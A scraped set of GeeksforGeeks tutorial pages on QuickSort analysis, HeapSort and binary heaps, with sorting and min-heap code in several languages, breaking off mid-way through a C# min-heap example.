quickSort(arr, 0, n-1); Console.WriteLine("sorted array "); printArray(arr, n); } } // This code is contributed by Sam007. chevron_right filter_none Output: Sorted array: 1 5 7 8 9 10 Analysis of QuickSort Time taken by QuickSort in general can be written as following. T(n) = T(k) + T(n-k-1) + (n) The first two terms are for two recursive calls, the last term is for the partition process. k is the number of elements which are smaller than pivot. The time taken by QuickSort depends upon the input array and partition strategy. Following are three cases. Worst Case: The worst case occurs when the partition process always picks greatest or smallest element as pivot. If we consider above partition strategy where last element is always picked as pivot, the worst case would occur when the array is already sorted in increasing or decreasing order. Following is recurrence for worst case. T(n) = T(0) + T(n-1) + (n) which is equivalent to T(n) = T(n-1) + (n) The solution of above recurrence is (n2). Best Case: The best case occurs when the partition process always picks the middle element as pivot. Following is recurrence for best case. T(n) = 2T(n/2) + (n) The solution of above recurrence is (nLogn). It can be solved using case 2 of Master Theorem. Average Case: To do average case analysis, we need to consider all possible permutation of array and calculate time taken by every permutation which doesn’t look easy. We can get an idea of average case by considering the case when partition puts O(n/9) elements in one set and O(9n/10) elements in other set. Following is recurrence for this case. T(n) = T(n/9) + T(9n/10) + (n) Solution of above recurrence is also O(nLogn) Although the worst case time complexity of QuickSort is O(n2) which is more than many other sorting algorithms like Merge Sort and Heap Sort, QuickSort is faster in practice, because its inner loop can be efficiently implemented on most architectures, and in most real-world data. QuickSort can be implemented in different ways by changing the choice of pivot, so that the worst case rarely occurs for a given type of data. However, merge sort is generally considered better when data is huge and stored in external storage. Is QuickSort stable? The default implementation is not stable. However any sorting algorithm can be made stable by considering indexes as comparison parameter. Is QuickSort In-place? As per the broad definition of in-place algorithm it qualifies as an in-place sorting algorithm as it uses extra space only for storing recursive function calls but not for manipulating the input. What is 3-Way QuickSort? In simple QuickSort algorithm, we select an element as pivot, partition the array around pivot and recur for subarrays on left and right of pivot. Consider an array which has many redundant elements. For example, {1, 4, 2, 4, 2, 4, 1, 2, 4, 1, 2, 2, 2, 2, 4, 1, 4, 4, 4}. If 4 is picked as pivot in Simple QuickSort, we fix only one 4 and recursively process remaining occurrences. In 3 Way QuickSort, an array arr[l..r] is divided in 3 parts: a) arr[l..i] elements less than pivot. b) arr[i+1..j-1] elements equal to pivot. c) arr[j..r] elements greater than pivot. See this for implementation. How to implement QuickSort for Linked Lists? QuickSort on Singly Linked List QuickSort on Doubly Linked List Can we implement QuickSort Iteratively? Yes, please refer Iterative Quick Sort. Why Quick Sort is preferred over MergeSort for sorting Arrays Quick Sort in its general form is an in-place sort (i.e. it doesn’t require any extra storage) whereas merge sort requires O(N) extra storage, N denoting the array size which may be quite expensive. Allocating and de-allocating the extra space used for merge sort increases the running time of the algorithm. Comparing average complexity we find that both type of sorts have O(NlogN) average complexity but the constants differ. For arrays, merge sort loses due to the use of extra O(N) storage space. Most practical implementations of Quick Sort use randomized version. The randomized version has expected time complexity of O(nLogn). The worst case is possible in randomized version also, but worst case doesn’t occur for a particular pattern (like sorted array) and randomized Quick Sort works well in practice. Quick Sort is also a cache friendly sorting algorithm as it has good locality of reference when used for arrays. Quick Sort is also tail recursive, therefore tail call optimizations is done. Why MergeSort is preferred over QuickSort for Linked Lists? In case of linked lists the case is different mainly due to difference in memory allocation of arrays and linked lists. Unlike arrays, linked list nodes may not be adjacent in memory. Unlike array, in linked list, we can insert items in the middle in O(1) extra space and O(1) time. Therefore merge operation of merge sort can be implemented without extra space for linked lists. In arrays, we can do random access as elements are continuous in memory. Let us say we have an integer (4-byte) array A and let the address of A[0] be x then to access A[i], we can directly access the memory at (x + i*4). Unlike arrays, we can not do random access in linked list. Quick Sort requires a lot of this kind of access. In linked list to access i’th index, we have to travel each and every node from the head to i’th node as we don’t have continuous block of memory. Therefore, the overhead increases for quick sort. Merge sort accesses data sequentially and the need of random access is low. How to optimize QuickSort so that it takes O(Log n) extra space in worst case? Please see QuickSort Tail Call Optimization (Reducing worst case space to Log n ) Snapshots: Quiz on QuickSort Recent Articles on QuickSort Coding practice for sorting. References: http://en.wikipedia.org/wiki/Quicksort Other Sorting Algorithms on GeeksforGeeks/GeeksQuiz: Selection Sort, Bubble Sort, Insertion Sort, Merge Sort, Heap Sort, QuickSort, Radix Sort, Counting Sort, Bucket Sort, ShellSort, Comb Sort, Pigeonhole Sort Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:When does the worst case of Quicksort occur?QuickSort on Doubly Linked ListQuickSort on Singly Linked ListCan QuickSort be implemented in O(nLogn) worst case time complexity?3-Way QuickSort (Dutch National Flag)QuickSort Tail Call Optimization (Reducing worst case space to Log n )Hoare's vs Lomuto partition scheme in QuickSortWhy quicksort is better than mergesort ?Dual pivot QuicksortC++ Program for QuickSortJava Program for QuickSortPython Program for QuickSortComparisons involved in Modified Quicksort Using Merge Sort TreeGeneric Implementation of QuickSort Algorithm in CStable QuickSortQuickSort using Random PivotingMerge two sorted arrays in O(1) extra space using QuickSort partitionImproved By : Palak Jain 5, UditChaudhary, lakshaygupta2807, rathbhupendra, ays14 Article Tags : Divide and ConquerSortingAdobeGoldman SachsHSBCQualcommQuick SortSamsungSAP LabsTarget Corporation Practice Tags : SamsungGoldman SachsAdobeSAP LabsQualcommHSBCTarget CorporationDivide and ConquerSorting thumb_up 201 To-do Done 2.8 Based on 260 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Count all distinct pairs with difference equal to k Next last_page Binary Search Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Divide and Conquer Maximum and minimum of an array using minimum number of comparisonsComplexity Analysis of Binary SearchDivide and Conquer Algorithm | IntroductionWrite a program to calculate pow(x,n)Median of two sorted arrays of same size Most visited in Sorting Bubble SortInsertion SortSelection SortTime Complexities of all Sorting Algorithmsstd::sort() in C++ STL room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

HeapSort - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationK'th Smallest/Largest Element in Unsorted Array | Set 1Huffman Coding | Greedy Algo-3k largest(or smallest) elements in an array | added Min Heap method HeapSort Last Updated: 16-11-2020 Heap sort is a comparison based sorting technique based on Binary Heap data structure. It is similar to selection sort where we first find the maximum element and place the maximum element at the end. We repeat the same process for the remaining elements. What is Binary Heap? Let us first define a Complete Binary Tree. A complete binary tree is a binary tree in which every level, except possibly the last, is completely filled, and all nodes are as far left as possible (Source Wikipedia)A Binary Heap is a Complete Binary Tree where items are stored in a special order such that value in a parent node is greater(or smaller) than the values in its two children nodes. The former is called as max heap and the latter is called min-heap. The heap can be represented by a binary tree or array. Why array based representation for Binary Heap? Since a Binary Heap is a Complete Binary Tree, it can be easily represented as an array and the array-based representation is space-efficient. If the parent node is stored at index I, the left child can be calculated by 2 * I + 1 and right child by 2 * I + 2 (assuming the indexing starts at 0). Heap Sort Algorithm for sorting in increasing order: 1. Build a max heap from the input data. 2. At this point, the largest item is stored at the root of the heap. Replace it with the last item of the heap followed by reducing the size of heap by 1. Finally, heapify the root of the tree. 3. Repeat step 2 while size of heap is greater than 1. How to build the heap? Heapify procedure can be applied to a node only if its children nodes are heapified. So the heapification must be performed in the bottom-up order.Lets understand with the help of an example: Input data: 4, 10, 3, 5, 1 4(0) / \ 10(1) 3(2) / \ 5(3) 1(4) The numbers in bracket represent the indices in the array representation of data. Applying heapify procedure to index 1: 4(0) / \ 10(1) 3(2) / \ 5(3) 1(4) Applying heapify procedure to index 0: 10(0) / \ 5(1) 3(2) / \ 4(3) 1(4) The heapify procedure calls itself recursively to build heap in top down manner. Recommended: Please solve it on “PRACTICE” first, before moving on to the solution. C++ filter_none edit close play_arrow link brightness_4 code // C++ program for implementation of Heap Sort #include <iostream> using namespace std; // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap void heapify(int arr[], int n, int i) { int largest = i; // Initialize largest as root int l = 2 * i + 1; // left = 2*i + 1 int r = 2 * i + 2; // right = 2*i + 2 // If left child is larger than root if (l < n && arr[l] > arr[largest]) largest = l; // If right child is larger than largest so far if (r < n && arr[r] > arr[largest]) largest = r; // If largest is not root if (largest != i) { swap(arr[i], arr[largest]); // Recursively heapify the affected sub-tree heapify(arr, n, largest); } } // main function to do heap sort void heapSort(int arr[], int n) { // Build heap (rearrange array) for (int i = n / 2 - 1; i >= 0; i--) heapify(arr, n, i); // One by one extract an element from heap for (int i = n - 1; i > 0; i--) { // Move current root to end swap(arr[0], arr[i]); // call max heapify on the reduced heap heapify(arr, i, 0); } } /* A utility function to print array of size n */ void printArray(int arr[], int n) { for (int i = 0; i < n; ++i) cout << arr[i] << " "; cout << "\n"; } // Driver code int main() { int arr[] = { 12, 11, 13, 5, 6, 7 }; int n = sizeof(arr) / sizeof(arr[0]); heapSort(arr, n); cout << "Sorted array is \n"; printArray(arr, n); } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for implementation of Heap Sort public class HeapSort { public void sort(int arr[]) { int n = arr.length; // Build heap (rearrange array) for (int i = n / 2 - 1; i >= 0; i--) heapify(arr, n, i); // One by one extract an element from heap for (int i = n - 1; i > 0; i--) { // Move current root to end int temp = arr[0]; arr[0] = arr[i]; arr[i] = temp; // call max heapify on the reduced heap heapify(arr, i, 0); } } // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap void heapify(int arr[], int n, int i) { int largest = i; // Initialize largest as root int l = 2 * i + 1; // left = 2*i + 1 int r = 2 * i + 2; // right = 2*i + 2 // If left child is larger than root if (l < n && arr[l] > arr[largest]) largest = l; // If right child is larger than largest so far if (r < n && arr[r] > arr[largest]) largest = r; // If largest is not root if (largest != i) { int swap = arr[i]; arr[i] = arr[largest]; arr[largest] = swap; // Recursively heapify the affected sub-tree heapify(arr, n, largest); } } /* A utility function to print array of size n */ static void printArray(int arr[]) { int n = arr.length; for (int i = 0; i < n; ++i) System.out.print(arr[i] + " "); System.out.println(); } // Driver code public static void main(String args[]) { int arr[] = { 12, 11, 13, 5, 6, 7 }; int n = arr.length; HeapSort ob = new HeapSort(); ob.sort(arr); System.out.println("Sorted array is"); printArray(arr); } } chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Python program for implementation of heap Sort # To heapify subtree rooted at index i. # n is size of heap def heapify(arr, n, i): largest = i # Initialize largest as root l = 2 * i + 1 # left = 2*i + 1 r = 2 * i + 2 # right = 2*i + 2 # See if left child of root exists and is # greater than root if l < n and arr[largest] < arr[l]: largest = l # See if right child of root exists and is # greater than root if r < n and arr[largest] < arr[r]: largest = r # Change root, if needed if largest != i: arr[i], arr[largest] = arr[largest], arr[i] # swap # Heapify the root. heapify(arr, n, largest) # The main function to sort an array of given size def heapSort(arr): n = len(arr) # Build a maxheap. for i in range(n//2 - 1, -1, -1): heapify(arr, n, i) # One by one extract elements for i in range(n-1, 0, -1): arr[i], arr[0] = arr[0], arr[i] # swap heapify(arr, i, 0) # Driver code arr = [12, 11, 13, 5, 6, 7] heapSort(arr) n = len(arr) print("Sorted array is") for i in range(n): print("%d" % arr[i]), # This code is contributed by Mohit Kumra chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for implementation of Heap Sort using System; public class HeapSort { public void sort(int[] arr) { int n = arr.Length; // Build heap (rearrange array) for (int i = n / 2 - 1; i >= 0; i--) heapify(arr, n, i); // One by one extract an element from heap for (int i = n - 1; i > 0; i--) { // Move current root to end int temp = arr[0]; arr[0] = arr[i]; arr[i] = temp; // call max heapify on the reduced heap heapify(arr, i, 0); } } // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap void heapify(int[] arr, int n, int i) { int largest = i; // Initialize largest as root int l = 2 * i + 1; // left = 2*i + 1 int r = 2 * i + 2; // right = 2*i + 2 // If left child is larger than root if (l < n && arr[l] > arr[largest]) largest = l; // If right child is larger than largest so far if (r < n && arr[r] > arr[largest]) largest = r; // If largest is not root if (largest != i) { int swap = arr[i]; arr[i] = arr[largest]; arr[largest] = swap; // Recursively heapify the affected sub-tree heapify(arr, n, largest); } } /* A utility function to print array of size n */ static void printArray(int[] arr) { int n = arr.Length; for (int i = 0; i < n; ++i) Console.Write(arr[i] + " "); Console.Read(); } // Driver code public static void Main() { int[] arr = { 12, 11, 13, 5, 6, 7 }; int n = arr.Length; HeapSort ob = new HeapSort(); ob.sort(arr); Console.WriteLine("Sorted array is"); printArray(arr); } } // This code is contributed // by Akanksha Rai(Abby_akku) chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // Php program for implementation of Heap Sort // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap function heapify(&$arr, $n, $i) { $largest = $i; // Initialize largest as root $l = 2*$i + 1; // left = 2*i + 1 $r = 2*$i + 2; // right = 2*i + 2 // If left child is larger than root if ($l < $n && $arr[$l] > $arr[$largest]) $largest = $l; // If right child is larger than largest so far if ($r < $n && $arr[$r] > $arr[$largest]) $largest = $r; // If largest is not root if ($largest != $i) { $swap = $arr[$i]; $arr[$i] = $arr[$largest]; $arr[$largest] = $swap; // Recursively heapify the affected sub-tree heapify($arr, $n, $largest); } } // main function to do heap sort function heapSort(&$arr, $n) { // Build heap (rearrange array) for ($i = $n / 2 - 1; $i >= 0; $i--) heapify($arr, $n, $i); // One by one extract an element from heap for ($i = $n-1; $i > 0; $i--) { // Move current root to end $temp = $arr[0]; $arr[0] = $arr[$i]; $arr[$i] = $temp; // call max heapify on the reduced heap heapify($arr, $i, 0); } } /* A utility function to print array of size n */ function printArray(&$arr, $n) { for ($i = 0; $i < $n; ++$i) echo ($arr[$i]." ") ; } // Driver program $arr = array(12, 11, 13, 5, 6, 7); $n = sizeof($arr)/sizeof($arr[0]); heapSort($arr, $n); echo 'Sorted array is ' . "\n"; printArray($arr , $n); // This code is contributed by Shivi_Aggarwal ?> chevron_right filter_none Output Sorted array is 5 6 7 11 12 13 Here is previous C code for reference. Notes: Heap sort is an in-place algorithm. Its typical implementation is not stable, but can be made stable (See this) Time Complexity: Time complexity of heapify is O(Logn). Time complexity of createAndBuildHeap() is O(n) and overall time complexity of Heap Sort is O(nLogn). Applications of HeapSort 1. Sort a nearly sorted (or K sorted) array 2. k largest(or smallest) elements in an array Heap sort algorithm has limited uses because Quicksort and Mergesort are better in practice. Nevertheless, the Heap data structure itself is enormously used. See Applications of Heap Data Structurehttps://youtu.be/MtQL_ll5KhQSnapshots: Quiz on Heap Sort Other Sorting Algorithms on GeeksforGeeks/GeeksQuiz:QuickSort, Selection Sort, Bubble Sort, Insertion Sort, Merge Sort, Heap Sort, QuickSort, Radix Sort, Counting Sort, Bucket Sort, ShellSort, Comb Sort, Pigeonhole Sort Coding practice for sorting. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Iterative HeapSortSplit array into K subarrays with minimum sum of absolute difference between adjacent elementsQueries to check if sweets of given type can be eaten on given day or notAmazon Interview Experience for System Development Engineer (On-Campus Dec 2020)Count pairs (i, j) from given array such that i K * arr[j]Amazon Interview Experience for SDE-Intern | On-Campus 2021Lexicographically largest string possible by reversing substrings having even number of 1sOracle Interview Experience | On-Campus 2020 (Virtual)Selection Sort VS Bubble SortOracle Interview Experience for Associate Software Engineer (On-Campus 2021)Count maximum possible pairs from an array having sum KAmazon Interview Experience for SDE-2Print all array elements appearing more than N / K timesCheck if all K-length subset sums of first array greater than that of the second arrayImproved By : Shivi_Aggarwal, Akanksha_Rai, RishiAdvani, Vibhav Gupta, kushjaing, more rishiraj1996, Ameya Gharpure, jainabhi279 Article Tags : HeapSorting24*7 Innovation LabsAmazonBelzabarHeap SortIntuitOracleSamsungSAP LabsVisa Practice Tags : AmazonSamsung24*7 Innovation LabsOracleVisaSAP LabsBelzabarSortingHeap thumb_up 121 To-do Done 3.2 Based on 219 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Merge Sort Next last_page Counting Sort Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Heap Building Heap from ArrayReal-time application of Data StructuresInsertion and Deletion in HeapsMax Heap in JavaOverview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash) Most visited in Sorting Bubble SortInsertion SortSelection SortTime Complexities of all Sorting Algorithmsstd::sort() in C++ STL room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Binary Heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationK'th Smallest/Largest Element in Unsorted Array | Set 1Huffman Coding | Greedy Algo-3k largest(or smallest) elements in an array | added Min Heap method Binary Heap Last Updated: 08-09-2020 A Binary Heap is a Binary Tree with following properties. 1) It’s a complete tree (All levels are completely filled except possibly the last level and the last level has all keys as left as possible). This property of Binary Heap makes them suitable to be stored in an array. 2) A Binary Heap is either Min Heap or Max Heap. In a Min Binary Heap, the key at root must be minimum among all keys present in Binary Heap. The same property must be recursively true for all nodes in Binary Tree. Max Binary Heap is similar to MinHeap. Examples of Min Heap: 10 10 / \ / \ 20 100 15 30 / / \ / \ 30 40 50 100 40 How is Binary Heap represented? A Binary Heap is a Complete Binary Tree. A binary heap is typically represented as an array. The root element will be at Arr[0]. Below table shows indexes of other nodes for the ith node, i.e., Arr[i]: Arr[(i-1)/2] Returns the parent node Arr[(2*i)+1] Returns the left child node Arr[(2*i)+2] Returns the right child node The traversal method use to achieve Array representation is Level Order Please refer Array Representation Of Binary Heap for details. Applications of Heaps: 1) Heap Sort: Heap Sort uses Binary Heap to sort an array in O(nLogn) time. 2) Priority Queue: Priority queues can be efficiently implemented using Binary Heap because it supports insert(), delete() and extractmax(), decreaseKey() operations in O(logn) time. Binomoial Heap and Fibonacci Heap are variations of Binary Heap. These variations perform union also efficiently. 3) Graph Algorithms: The priority queues are especially used in Graph Algorithms like Dijkstra’s Shortest Path and Prim’s Minimum Spanning Tree. 4) Many problems can be efficiently solved using Heaps. See following for example. a) K’th Largest Element in an array. b) Sort an almost sorted array/ c) Merge K Sorted Arrays. Operations on Min Heap: 1) getMini(): It returns the root element of Min Heap. Time Complexity of this operation is O(1). 2) extractMin(): Removes the minimum element from MinHeap. Time Complexity of this Operation is O(Logn) as this operation needs to maintain the heap property (by calling heapify()) after removing root. 3) decreaseKey(): Decreases value of key. The time complexity of this operation is O(Logn). If the decreases key value of a node is greater than the parent of the node, then we don’t need to do anything. Otherwise, we need to traverse up to fix the violated heap property. 4) insert(): Inserting a new key takes O(Logn) time. We add a new key at the end of the tree. IF new key is greater than its parent, then we don’t need to do anything. Otherwise, we need to traverse up to fix the violated heap property. 5) delete(): Deleting a key also takes O(Logn) time. We replace the key to be deleted with minum infinite by calling decreaseKey(). After decreaseKey(), the minus infinite value must reach root, so we call extractMin() to remove the key. Below is the implementation of basic heap operations. C++ filter_none edit close play_arrow link brightness_4 code // A C++ program to demonstrate common Binary Heap Operations #include<iostream> #include<climits> using namespace std; // Prototype of a utility function to swap two integers void swap(int *x, int *y); // A class for Min Heap class MinHeap { int *harr; // pointer to array of elements in heap int capacity; // maximum possible size of min heap int heap_size; // Current number of elements in min heap public: // Constructor MinHeap(int capacity); // to heapify a subtree with the root at given index void MinHeapify(int ); int parent(int i) { return (i-1)/2; } // to get index of left child of node at index i int left(int i) { return (2*i + 1); } // to get index of right child of node at index i int right(int i) { return (2*i + 2); } // to extract the root which is the minimum element int extractMin(); // Decreases key value of key at index i to new_val void decreaseKey(int i, int new_val); // Returns the minimum key (key at root) from min heap int getMin() { return harr[0]; } // Deletes a key stored at index i void deleteKey(int i); // Inserts a new key 'k' void insertKey(int k); }; // Constructor: Builds a heap from a given array a[] of given size MinHeap::MinHeap(int cap) { heap_size = 0; capacity = cap; harr = new int[cap]; } // Inserts a new key 'k' void MinHeap::insertKey(int k) { if (heap_size == capacity) { cout << "\nOverflow: Could not insertKey\n"; return; } // First insert the new key at the end heap_size++; int i = heap_size - 1; harr[i] = k; // Fix the min heap property if it is violated while (i != 0 && harr[parent(i)] > harr[i]) { swap(&harr[i], &harr[parent(i)]); i = parent(i); } } // Decreases value of key at index 'i' to new_val. It is assumed that // new_val is smaller than harr[i]. void MinHeap::decreaseKey(int i, int new_val) { harr[i] = new_val; while (i != 0 && harr[parent(i)] > harr[i]) { swap(&harr[i], &harr[parent(i)]); i = parent(i); } } // Method to remove minimum element (or root) from min heap int MinHeap::extractMin() { if (heap_size <= 0) return INT_MAX; if (heap_size == 1) { heap_size--; return harr[0]; } // Store the minimum value, and remove it from heap int root = harr[0]; harr[0] = harr[heap_size-1]; heap_size--; MinHeapify(0); return root; } // This function deletes key at index i. It first reduced value to minus // infinite, then calls extractMin() void MinHeap::deleteKey(int i) { decreaseKey(i, INT_MIN); extractMin(); } // A recursive method to heapify a subtree with the root at given index // This method assumes that the subtrees are already heapified void MinHeap::MinHeapify(int i) { int l = left(i); int r = right(i); int smallest = i; if (l < heap_size && harr[l] < harr[i]) smallest = l; if (r < heap_size && harr[r] < harr[smallest]) smallest = r; if (smallest != i) { swap(&harr[i], &harr[smallest]); MinHeapify(smallest); } } // A utility function to swap two elements void swap(int *x, int *y) { int temp = *x; *x = *y; *y = temp; } // Driver program to test above functions int main() { MinHeap h(11); h.insertKey(3); h.insertKey(2); h.deleteKey(1); h.insertKey(15); h.insertKey(5); h.insertKey(4); h.insertKey(45); cout << h.extractMin() << " "; cout << h.getMin() << " "; h.decreaseKey(2, 1); cout << h.getMin(); return 0; } chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # A Python program to demonstrate common binary heap operations # Import the heap functions from python library from heapq import heappush, heappop, heapify # heappop - pop and return the smallest element from heap # heappush - push the value item onto the heap, maintaining # heap invarient # heapify - transform list into heap, in place, in linear time # A class for Min Heap class MinHeap: # Constructor to initialize a heap def __init__(self): self.heap = [] def parent(self, i): return (i-1)/2 # Inserts a new key 'k' def insertKey(self, k): heappush(self.heap, k) # Decrease value of key at index 'i' to new_val # It is assumed that new_val is smaller than heap[i] def decreaseKey(self, i, new_val): self.heap[i] = new_val while(i != 0 and self.heap[self.parent(i)] > self.heap[i]): # Swap heap[i] with heap[parent(i)] self.heap[i] , self.heap[self.parent(i)] = ( self.heap[self.parent(i)], self.heap[i]) # Method to remove minium element from min heap def extractMin(self): return heappop(self.heap) # This functon deletes key at index i. It first reduces # value to minus infinite and then calls extractMin() def deleteKey(self, i): self.decreaseKey(i, float("-inf")) self.extractMin() # Get the minimum element from the heap def getMin(self): return self.heap[0] # Driver pgoratm to test above function heapObj = MinHeap() heapObj.insertKey(3) heapObj.insertKey(2) heapObj.deleteKey(1) heapObj.insertKey(15) heapObj.insertKey(5) heapObj.insertKey(4) heapObj.insertKey(45) print heapObj.extractMin(), print heapObj.getMin(), heapObj.decreaseKey(2, 1) print heapObj.getMin() # This code is contributed by Nikhil Kumar Singh(nickzuck_007) chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program to demonstrate common // Binary Heap Operations - Min Heap using System; // A class for Min Heap class MinHeap{ // To store array of elements in heap public int[] heapArray{ get; set; } // max size of the heap public int capacity{ get; set; } // Current number of elements in the heap public int current_heap_size{ get; set; } // Constructor public MinHeap(int n) { capacity = n; heapArray = new int[capacity]; current_heap_size = 0; } // Swapping using reference public static void Swap<T>(ref T lhs, ref T rhs) { T temp = lhs; lhs = rhs; rhs = temp; } // Get the Parent index for the given index public int Parent(int key) { return (key - 1) / 2; } // Get the Left Child index for the given index public int Left(int key) { return 2 * key + 1; } // Get the Right Child index for the given index public int Right(int key) { return 2 * key + 2; } // Inserts a new key public bool insertKey(int key) { if (current_heap_size == capacity) { // heap is full return false; } // First insert the new key at the end int i = current_heap_size; heapArray[i] = key; current_heap_size++; // Fix the min heap property if it is violated while (i != 0 && heapArray[i] < heapArray[Parent(i)]) { Swap(ref heapArray[i], ref heapArray[Parent(i)]); i = 